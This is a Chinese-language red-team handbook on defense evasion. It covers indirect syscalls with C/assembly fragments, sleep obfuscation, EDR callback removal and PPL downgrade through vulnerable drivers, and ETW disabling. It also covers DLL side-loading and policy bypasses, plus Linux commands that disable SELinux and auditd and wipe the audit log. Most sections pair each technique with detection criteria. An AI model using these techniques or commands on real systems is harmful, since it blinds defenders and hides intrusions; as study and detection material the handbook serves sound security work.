# Advanced Evasion — 睡眠混淆、间接 syscall、EDR 对抗、行为/二进制、签名滥用、策略绕过、Linux、加载器模式

> 本文件为 `evasion-comprehensive.md` §9 的伴生手册（补齐「sleep obfuscation, syscalls, EDR bypass,
> behavioral/binary evasion, signed binary abuse, Windows policy bypass, Linux evasion, loader patterns」断链）。
> 覆盖 P1 缺口：间接 syscall 全路线、sleep obfuscation 实现、内核回调/PPL 对抗、ETW provider 禁用、
> 签名二进制滥用、Windows 策略绕过、Linux 对抗。授权立场与检测侧配对纪律见 `refs/README.md`。

---

## 1. 间接系统调用全路线（Indirect Syscalls）

### 1.1 概念：直接 vs 间接

```
直接 syscall：  用户代码 → syscall 指令(在你自己的内存) → 内核   ← syscall 来源异常
间接 syscall：  用户代码 → jmp 到 ntdll 的 syscall 指令 → 内核   ← 返回地址合法
```

### 1.2 SSN 动态解析（Hell's Gate）

```c
// PEB -> Ldr -> ntdll.dll 基址 -> 导出表 -> 定位 stub -> 逐字节扫 syscall
PPEB peb = (PPEB)__readgsqword(0x60);
PLDR_DATA_TABLE_ENTRY ntdll = NULL;
for (PLIST_ENTRY e = peb->Ldr->InMemoryOrderModuleList.Flink;
     e != &peb->Ldr->InMemoryOrderModuleList; e = e->Flink) {
    PLDR_DATA_TABLE_ENTRY m = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    // hash 比对 BaseDllName == "ntdll.dll"
    ntdll = m; break;
}
HMODULE base = (HMODULE)ntdll->DllBase;
PIMAGE_EXPORT_DIRECTORY exp = /* 遍历 PE 头定位导出表 */;
// 遍历 AddressOfNames，hash 匹配目标函数 -> AddressOfFunctions 取 RVA
BYTE* stub = (BYTE*)base + rva;
for (int i = 0; i < 24; i++) {
    if (stub[i] == 0x4C && stub[i+1] == 0x8B && stub[i+2] == 0xD1) {   // mov r10, rcx
        DWORD ssn = *(DWORD*)(stub + i + 4);                            // eax, SSN
        break;
    }
}
```

### 1.3 Halo's Gate（stub 被 hook 时）

```c
// 若 stub[0] == 0xE9（被 EDR 相对 jmp hook）
// 向上/向下找最近一个「未被 hook 且含 0x0F 0x05」的相邻 syscall
// 利用 SSN 连续递增规律：目标 SSN = 相邻 SSN ± (目标函数在导出表中的相对偏移)
// 据此从被 hook 的函数名推算出真实 SSN
```

### 1.4 TartarusGate（展开）

**原理**：Halo's Gate 的增强。不仅从相邻 syscall 推算 SSN，还**从干净的 ntdll 副本（磁盘/KnownDlls）读回被 hook 区域的原始字节**，把「解析 SSN」与「恢复 stub」结合，兼顾被 hook 的 syscall 与被 hook 的非 syscall 函数。

### 1.5 FreshyCalls

```c
// 思路：按函数名字典序排序的干净 syscall stub 表，全部来自 fresh ntdll 内存
// 1) 读 \KnownDlls\ntdll.dll 干净副本，映射到私有 RX 区
// 2) 枚举导出表，按名称排序，分配连续内存保存每个 stub 的 syscall 指令地址
// 3) 调用时按 index jmp 过去（返回地址指向 fresh 区），无 SSN 解析、无 hook 命中
```

### 1.6 间接 syscall 栈伪造（返回地址指向 ntdll）

```nasm
; 间接 syscall stub：jmp 到 ntdll 内真实 syscall 指令
; 栈上返回地址自然落在 ntdll，EDR 栈回溯「干净」
NtAllocateVirtualMemory_indirect:
    mov r10, rcx
    mov eax, SSN
    jmp qword ptr [ntdll_syscall_gadget]   ; 跳向 ntdll 内 syscall 指令地址
```

```c
// 定位 ntdll 内 syscall 指令（跳过 stub 序言，直接指到 0x0F 0x05）
BYTE* syscall_gadget = stub + i;   // i 为找到 0x0F 0x05 的偏移
```

### 1.7 检测侧：syscall 指令地址合法域校验

| 判据 | 方法 |
|---|---|
| syscall 指令地址 ∈ ntdll `.text` | EDR/ETWTI 栈回溯取返回地址，校验是否在已加载 ntdll 节区 |
| 直接 syscall（非法） | 返回地址落在私有 RX/RWX 内存 |
| 间接 syscall（合法表象） | 返回地址在 ntdll，但需进一步校验「调用点」是否真实（Elastic call gadget 研究） |

---

## 2. Sleep Obfuscation 实现（Ekko / Foliage / DeathSleep）

### 2.1 Ekko（Timer Queue + ROP）

```c
// 原理：用 CreateTimerQueueTimer 定时触发 ROP 链，睡眠期加密内存
// 1) 分配 ROP 链：RtlCaptureContext -> 加密 gadget -> 对称解密 gadget -> NtContinue
// 2) 定时器回调指向 ROP 链首地址
// 3) 触发时：捕获上下文 -> RC4/AES 加密可睡眠内存区 -> 等待
// 4) 唤醒：解密 -> NtContinue 恢复执行
HANDLE timerQueue = CreateTimerQueue();
CreateTimerQueueTimer(&hTimer, timerQueue, (WAITORTIMERCALLBACK)rop_chain, NULL,
                      sleep_ms, 0, WT_EXECUTEINTIMERTHREAD);
```

### 2.2 Foliage（APC + 睡眠加密）

```c
// 原理：APC-based，睡眠时把内存加密，唤醒前经 APC 解密
// 与 Ekko 区别：触发载体是 APC（alertable 等待），而非定时器队列
```

### 2.3 DeathSleep（线程去注册）

```c
// 原理：睡眠期把线程「去注册」（从线程列表中摘除），内存扫描器看不到该线程
// 恢复时再注册回来，配合内存加密更隐蔽
```

### 2.4 检测侧

| 技术 | 检测点 | 判据 |
|---|---|---|
| Ekko | TimerQueue 回调异常 + ROP | 睡眠期内存高熵/加密 + 定时器回调地址异常 |
| Foliage | APC + 加密 | 睡眠期内存快照加密区域 |
| DeathSleep | 线程去注册 | 线程列表与内存扫描不一致 |

**睡眠期内存扫描遥测指标**：扫描频率提升（EDR 检测到加密区域）、`VirtualProtect` 突变轨迹、内存快照熵突变。

---

## 3. EDR 内核回调 / PPL 对抗（P1 #11）

### 3.1 内核回调（ObRegisterCallbacks）绕过

**原理**：EDR 用 `ObRegisterCallbacks` 注册进程/线程/桌面对象回调。绕过方向：
- **摘除回调项**：经 BYOVD 驱动把 EDR 的回调从回调数组中置空/摘除（见 `byovd-driver-exploitation.md`）。
- **避开回调触发的对象操作**：不新建进程/线程（Threadless/线程复用），回调无事件可拦。

### 3.2 PPL（保护进程）对抗

**原理**：PPL（Protected Process Light）阻止对 LSASS 等进程的 `OpenProcess` 读。对抗路线：
- **降级 PPL**：经 BYOVD 驱动改 EPROCESS 的 Protection 字段清除 PPL 位（见 T133）。
- **注册表关 RunAsPPL**：`HKLM\SYSTEM\CurrentControlSet\Control\Lsa` 的 `RunAsPPL=0`（需重启）。

### 3.3 句柄权限对抗

**原理**：`PROCESS_ALL_ACCESS` 句柄是检测热点。对抗：
- **降级到受控句柄**：只申请所需最小权限（`PROCESS_VM_READ` 等），规避「全访问句柄」告警。
- **句柄复制/间接访问**：经管道/ALPC 间接获取读权限。

### 3.4 检测侧

| 对抗点 | 检测点 | 判据 |
|---|---|---|
| 回调摘除 | 内核回调数组被篡改 | EDR 行为监控静默 |
| PPL 降级 | Protection 字段/RunAsPPL 变更 | 保护级别遥测 + lsass 访问 |
| 句柄降级 | 句柄权限变更 | 进程访问遥测（权限掩码） |

---

## 4. ETW provider 禁用（非 patch，P1 #28）

```csharp
// SetEnabled 内部方法：把 provider 的 enabled 位清掉
// System.Diagnostics.Tracing.EventProvider 内部字段 m_enabled/m_level
// 反射定位后置 0，provider 停止投递事件（不改代码字节，比 patch ntdll 更隐蔽）
```

```c
// 内核 ETW TI flag 清除（EDRSandBlast 思路）
// 经 BYOVD 驱动清 EtwThreatIntProvRegHandle 相关全局，盲掉 EDR 的 ETWTI
```

**检测侧**：provider 注册状态被改 + ETW 通道静默；EDR 检测 provider enable 状态异常 + 心跳缺失。详见 `AMSI_ETW_BYPASS.md` §2。

---

## 5. 行为/二进制对抗（Behavioral/Binary Evasion）

### 5.1 行为对抗

- **行为序列拟真**：模拟正常程序行为（先做无害操作，再触发核心逻辑），对抗行为序列评分。
- **进程树规避**：PPID 欺骗（`UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`）把父进程伪装成合法进程。

### 5.2 二进制对抗

- **节区/元数据改写**：改时间戳、strip PDB、去 Rich header、改编译器特征。
- **熵值消减**：加大量正常文本/图标资源，稀释 payload 熵。

---

## 6. 签名二进制滥用（Signed Binary Abuse）

**原理**：借合法签名二进制执行恶意行为（LOLBin 执行、DLL 侧加载、COM 劫持），让「签名」背书掩盖行为。

```powershell
# 示例：签名 DLL 侧加载（把恶意 DLL 放到被签名 EXE 的同目录）
# 目标 EXE 加载缺省 DLL 时优先同目录 -> 执行恶意代码，签名归属合法
```

**检测侧**：签名合法但行为异常（LOLBin 网络外连、异常 DLL 加载路径）；Sysmon 7/12 + 证书透明度。

---

## 7. Windows 策略绕过（Policy Bypass）

### 7.1 AppLocker / WDAC 绕过

- LOLBin 执行（不在拦截清单内的签名二进制）。
- reg-free COM / .NET `Assembly.Load` 内存加载。

### 7.2 PowerShell 策略绕过

```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -EncodedCommand <base64>
# Constrained Language Mode 绕过：切换到 C#/LOLBin
```

---

## 8. Linux 对抗（Linux Evasion）

- **SELinux**：`setenforce 0`（需 root）；或利用未约束域/错误策略。
- **AppArmor**：`aa-complain <profile>` 或利用宽松 profile。
- **auditd**：清日志（`> /var/log/audit/audit.log`）、或 `auditctl -e 0` 关审计。
- **LD_PRELOAD / 动态链接劫持**：注入恶意共享库到目标进程。

**检测侧**：SELinux 模式切换事件、auditd 日志静默、异常 `LD_PRELOAD` 环境变量。

---

## 9. 加载器模式（Loader Patterns）

| 模式 | 关键点 | 检测侧 |
|---|---|---|
| 直接 VirtualAlloc | RWX + CreateThread | 高检测 |
| 回调执行 | 回调指针 = shellcode | 回调地址异常 |
| 间接 syscall | jmp ntdll + 栈伪造 | 返回地址校验 |
| Module Stomping | 覆写合法 DLL .text | 磁盘/内存哈希 |
| Threadless | 改远端线程栈 | 线程状态突变 |
| 滴灌(Drip) | 分块写 + RX 转换 | 写入-执行间隔 |
| 反射加载 | 自建 PE loader | 自定义 loader 特征 |

---

## 10. 检测侧总表（回馈 attack-defense）

| 技术族 | 检测点 | 判据 |
|---|---|---|
| 间接 syscall | syscall 指令地址合法域 | 返回地址 ∈ ntdll .text |
| Sleep obf | 睡眠期内存加密 | 内存快照熵突变 |
| 内核回调/PPL | 回调数组/保护级别 | 遥测静默 + lsass 访问 |
| ETW 禁用 | provider 状态 | 心跳缺失 |
| 签名滥用 | 行为 vs 签名归属 | LOLBin 异常行为 |

*WARNING: 授权红队评估与安全研究专用。*
